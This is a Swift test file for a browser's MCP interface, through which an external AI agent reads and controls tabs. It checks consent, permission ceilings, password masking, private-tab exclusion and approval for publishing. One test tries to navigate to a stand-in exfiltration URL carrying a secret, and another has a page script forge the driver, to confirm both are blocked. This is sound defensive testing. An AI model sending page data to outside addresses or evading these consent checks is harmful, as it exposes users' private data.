// SPDX-FileCopyrightText: 2026 Kavoye
// SPDX-License-Identifier: Apache-2.0

import Foundation
import MCP
import Testing
import WebKit

@testable import Linen

@MainActor
@Suite(.boundedWebViews)
struct MCPPrivacyTests {
    private static let html = """
        <!doctype html><title>Shared fixture</title>
        <p>Visible shared text</p>
        <input aria-label="Search"><input aria-label="Password" type="password" value="hidden-secret">
        <button onclick="document.body.dataset.clicked='yes'">Ordinary action</button>
        <button onclick="document.body.dataset.published='yes'">Publish post</button>
        <a href="/next">Next page</a>
        """

    private func fixture() async throws -> (HTTPFixtureServer, BrowserModel, BrowserTab) {
        let server = try await HTTPFixtureServer.start(routes: [
            "/": .html(Self.html), "/next": .html("<p>Next page</p>"),
        ])
        let browser = BrowserModel(database: .temporary(), sitePermissions: SitePermissions(storageURL: nil))
        let url = try server.url()
        let tab = browser.newTab(url: url)
        #expect(await PageSettle.untilIdle(tab.webView))
        tab.assistantAccess.persistsAnswers = false
        tab.assistantAccess.pageChanged(url: url)
        return (server, browser, tab)
    }

    private func session(_ browser: BrowserModel, access: MCPAccessConsent.Access = .control) -> MCPBrowserSession {
        MCPBrowserSession(browser: browser, available: { true }, consent: { _, _ in access })
    }

    private func text(_ result: CallTool.Result) -> String {
        result.content.compactMap {
            if case .text(let text, _, _) = $0 {
                return text
            }
            return nil
        }.joined(separator: "\n")
    }

    private func call(
        _ session: MCPBrowserSession, _ name: String, tab: BrowserTab? = nil, arguments: [String: Value] = [:]
    ) async throws -> CallTool.Result {
        var arguments = arguments
        if let tab {
            arguments["tabID"] = .string(tab.id.uuidString)
        }
        return try await session.call(name: name, arguments: arguments)
    }

    private func observation(_ session: MCPBrowserSession, tab: BrowserTab) async throws -> String {
        let read = try await call(session, "readPage", tab: tab)
        #expect(read.isError == false, "\(text(read))")
        guard case .object(let object) = read.structuredContent else {
            throw MCPError.internalError("Missing observation")
        }
        return try #require(object["observationID"]?.stringValue)
    }

    @Test func actionObservationCanDriveTheNextActionWithoutAnotherRead() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        let first = try await observation(subject, tab: tab)
        let action = try await call(subject, "typeOnPage", tab: tab, arguments: [
            "observationID": .string(first), "ref": 1, "text": "hello",
        ])
        #expect(action.isError == false)
        guard case .object(let object) = action.structuredContent else { Issue.record("Missing action observation"); return }
        let next = try #require(object["observationID"]?.stringValue)
        #expect(next != first)
        let second = try await call(subject, "clickOnPage", tab: tab, arguments: ["observationID": .string(next), "ref": 3])
        #expect(second.isError == false, "\(text(second))")
        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.clicked") as? String == "yes")
        #expect(try await call(subject, "clickOnPage", tab: tab, arguments: ["observationID": .string(first), "ref": 3]).isError == true)
    }

    @Test func sameOriginNavigationReturnsAnObservationForTheNewDocument() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        let first = try await observation(subject, tab: tab)
        let action = try await call(subject, "clickOnPage", tab: tab, arguments: ["observationID": .string(first), "ref": 5])
        #expect(action.isError == false, "\(text(action))")
        guard case .object(let object) = action.structuredContent else { Issue.record("Missing navigation observation"); return }
        #expect(object["url"]?.stringValue?.hasSuffix("/next") == true)
        #expect(object["observationID"]?.stringValue != nil)
        #expect(text(action).contains("Next page"))
    }

    @Test func batchingUsesTheSameSensitiveFieldRulesAndReturnsPartialState() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        let first = try await observation(subject, tab: tab)
        let action = try await call(subject, "fillFields", tab: tab, arguments: [
            "observationID": .string(first), "fields": .array([
                .object(["ref": 1, "value": "query", "select": false]),
                .object(["ref": 2, "value": "never-written", "select": false]),
            ]),
        ])
        #expect(action.isError == true)
        #expect(text(action).contains("Filled 1 of 2"))
        #expect(!text(action).contains("hidden-secret"))
        #expect(try await tab.webView.evaluateJavaScript("document.querySelector('[type=password]').value") as? String == "hidden-secret")
    }

    @Test func connectingDoesNotRevealOrControlTabs() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = session(browser)
        let listed = try await call(subject, "listTabs")
        #expect(!text(listed).contains("Shared fixture"))
        #expect(!text(listed).contains(tab.id.uuidString))
        for name in ["readPage", "closeTab", "switchTab"] {
            #expect(try await call(subject, name, tab: tab).isError == true)
        }
        #expect(browser.tabs.count == 1)
    }

    @Test func sharingOnlyIncludesCapturedTabsAndDoesNotPersistPermissions() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let other = browser.newTab(url: URL(string: "https://unshared.invalid/"))
        other.title = "Hidden personal page"
        browser.activate(tab)
        let subject = session(browser)
        let shared = try await call(subject, "requestAccess")
        #expect(text(shared).contains(tab.id.uuidString))
        #expect(!text(shared).contains("Hidden personal page"))
        #expect(try await call(subject, "readPage", tab: other).isError == true)
        #expect(try await call(subject, "closeTab", tab: other).isError == true)
        #expect(tab.assistantAccess.effectivePolicy == .ask)
        #expect(browser.sitePermissions.assistantAccess(for: tab.assistantAccess.origin) == .ask)
    }

    @Test func readOnlyConnectionCannotControlAnOtherwiseAllowedSite() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        tab.assistantAccess.set(.control)
        let subject = session(browser, access: .readOnly)
        _ = try await call(subject, "requestAccess")
        _ = try await observation(subject, tab: tab)
        #expect(try await call(subject, "closeTab", tab: tab).isError == true)
        #expect(try await call(subject, "scrollPage", tab: tab, arguments: ["direction": "down"]).isError == true)
        #expect(tab.assistantAccess.effectivePolicy == .control)
    }

    @Test func siteRestrictionsRemainACeiling() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        tab.assistantAccess.set(.readOnly)
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        _ = try await observation(subject, tab: tab)
        #expect(try await call(subject, "closeTab", tab: tab).isError == true)
        tab.assistantAccess.set(.deny)
        let listed = try await call(subject, "listTabs")
        #expect(!text(listed).contains(tab.id.uuidString))
        #expect(try await call(subject, "readPage", tab: tab).isError == true)
    }

    @Test func privateAndInternalPagesCannotBeShared() async throws {
        let browser = BrowserModel(database: .temporary())
        let privateTab = BrowserTab(privately: true)
        privateTab.urlString = "https://private.invalid/"
        privateTab.title = "Private secret"
        browser.tabs = [privateTab]
        browser.activeTabID = privateTab.id
        var asked = false
        let subject = MCPBrowserSession(browser: browser, available: { true }, consent: { _, pages in
            asked = true
            #expect(pages.isEmpty)
            return .control
        })
        #expect(try await call(subject, "requestAccess").isError == true)
        #expect(asked)
        #expect(!text(try await call(subject, "listTabs")).contains("Private secret"))
    }

    @Test func emptyPagePromptDoesNotConsumeAccessRequest() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        browser.tabs = []
        browser.activeTabID = nil
        var prompts = 0
        let subject = MCPBrowserSession(browser: browser, available: { true }, consent: { _, pages in
            prompts += 1
            return pages.isEmpty ? nil : .readOnly
        })
        #expect(try await call(subject, "requestAccess").isError == true)
        browser.tabs = [tab]
        browser.activate(tab)
        #expect(try await call(subject, "requestAccess").isError == false)
        #expect(prompts == 2)
        #expect(text(try await call(subject, "listTabs")).contains(tab.id.uuidString))
    }

    @Test func changingPagesDuringConsentDoesNotShareTheReplacement() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = MCPBrowserSession(browser: browser, available: { true }, consent: { _, _ in
            tab.loadHTML("<p>Replacement secret</p>", baseURL: URL(string: "https://replacement.invalid/"))
            _ = await waitUntil { tab.webView.url?.host() == "replacement.invalid" }
            return .control
        })
        let shared = try await call(subject, "requestAccess")
        #expect(!text(shared).contains(tab.id.uuidString))
        #expect(try await call(subject, "readPage", tab: tab).isError == true)
    }

    @Test func readsMaskSecretsAndActionsRequireTheConnectionsOwnObservation() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let first = session(browser)
        let second = session(browser)
        _ = try await call(first, "requestAccess")
        _ = try await call(second, "requestAccess")
        let read = try await call(first, "readPage", tab: tab)
        #expect(!text(read).contains("hidden-secret"))
        #expect(text(read).contains("untrusted"))
        let id = try await observation(first, tab: tab)
        let wrong = try await call(second, "clickOnPage", tab: tab, arguments: ["observationID": .string(id), "ref": 3])
        #expect(wrong.isError == true)
        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.clicked || ''") as? String == "")
    }

    @Test func anotherReadInvalidatesControlReferences() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let first = session(browser)
        let second = session(browser)
        _ = try await call(first, "requestAccess")
        _ = try await call(second, "requestAccess")
        let stale = try await observation(first, tab: tab)
        _ = try await observation(second, tab: tab)
        let result = try await call(first, "clickOnPage", tab: tab, arguments: ["observationID": .string(stale), "ref": 3])
        #expect(result.isError == true)
        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.clicked || ''") as? String == "")
    }

    @Test func typingWorksButPasswordFieldsStayBlocked() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        let normal = try await observation(subject, tab: tab)
        let typed = try await call(subject, "typeOnPage", tab: tab, arguments: [
            "observationID": .string(normal), "ref": 1, "text": "hello",
        ])
        #expect(typed.isError == false, "\(text(typed))")
        #expect(try await tab.webView.evaluateJavaScript("document.querySelector('input').value") as? String == "hello")
        let password = try await observation(subject, tab: tab)
        let refused = try await call(subject, "typeOnPage", tab: tab, arguments: [
            "observationID": .string(password), "ref": 2, "text": "replacement",
        ])
        #expect(refused.isError == true)
        #expect(try await tab.webView.evaluateJavaScript("document.querySelector('[type=password]').value") as? String == "hidden-secret")
    }

    @Test func revokingDuringTheActionPausePreventsTheClick() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        let id = try await observation(subject, tab: tab)
        let result = try await PageDriver.$pauseSleeper.withValue({ _ in
            await subject.revoke()
        }) {
            try await call(subject, "clickOnPage", tab: tab, arguments: ["observationID": .string(id), "ref": 3])
        }
        #expect(result.isError == true)
        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.clicked || ''") as? String == "")
    }

    @Test func consequentialActionsDoNotInheritAssistantApprovals() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        let id = try await observation(subject, tab: tab)
        let inherited = AgentActionPolicy(storage: MCPActionGrantStorage())
        inherited.allowAlways(.publication, host: tab.webView.url?.host())
        var asked = false
        let result = try await AgentActionConsent.$scopedPolicy.withValue(inherited) {
            try await AgentActionConsent.$decisionForTesting.withValue(.init { _, _, _ in
                asked = true
                return .decline
            }) {
                try await call(subject, "clickOnPage", tab: tab, arguments: ["observationID": .string(id), "ref": 4])
            }
        }
        #expect(asked)
        #expect(result.isError == true)
        #expect(try await tab.webView.evaluateJavaScript("document.body.dataset.published || ''") as? String == "")
    }

    @Test func pageContentCannotSupplyAnUnobservedOutboundAddress() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        _ = try await observation(subject, tab: tab)
        let result = try await call(subject, "navigate", tab: tab, arguments: ["url": "https://exfiltration.invalid/?secret=value"])
        #expect(result.isError == true)
        #expect(tab.webView.url == (try server.url()))
    }

    @Test func observedNavigationWorksInTheSharedTab() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        _ = try await observation(subject, tab: tab)
        let destination = try server.url("/next")
        let result = try await call(subject, "navigate", tab: tab, arguments: ["url": .string(destination.absoluteString)])
        #expect(result.isError == false)
        #expect(await settled(tab, at: destination))
        let read = try await call(subject, "readPage", tab: tab)
        #expect(read.isError == false)
        #expect(text(read).contains("Next page"))
        #expect(browser.tabs.count == 1)
    }

    @Test func approvedNewTabsJoinOnlyTheRequestingConnection() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        var opens = 0
        let subject = MCPBrowserSession(browser: browser, available: { true }, consent: { _, _ in .control }, openConsent: { _, _ in
            opens += 1
            return true
        })
        let other = session(browser)
        _ = try await call(subject, "requestAccess")
        _ = try await call(other, "requestAccess")
        let destination = try server.url("/next")
        let opened = try await call(subject, "newTab", arguments: ["url": .string(destination.absoluteString)])
        #expect(opened.isError == false)
        #expect(opens == 1)
        let newTab = try #require(browser.activeTab)
        #expect(newTab !== tab)
        #expect(await settled(newTab, at: destination))
        #expect(try await call(subject, "readPage", tab: newTab).isError == false)
        #expect(try await call(other, "readPage", tab: newTab).isError == true)
    }

    @Test func pageWorldScriptsCannotReplaceTheExternalDriver() async throws {
        let (server, browser, tab) = try await fixture()
        defer { _ = server }
        _ = try await tab.webView.evaluateJavaScript("window.__linen = { pageText: () => 'forged-content', collect: () => [] };")
        let subject = session(browser)
        _ = try await call(subject, "requestAccess")
        let read = try await call(subject, "readPage", tab: tab)
        #expect(read.isError == false)
        #expect(text(read).contains("Visible shared text"))
        #expect(!text(read).contains("forged-content"))
    }
}
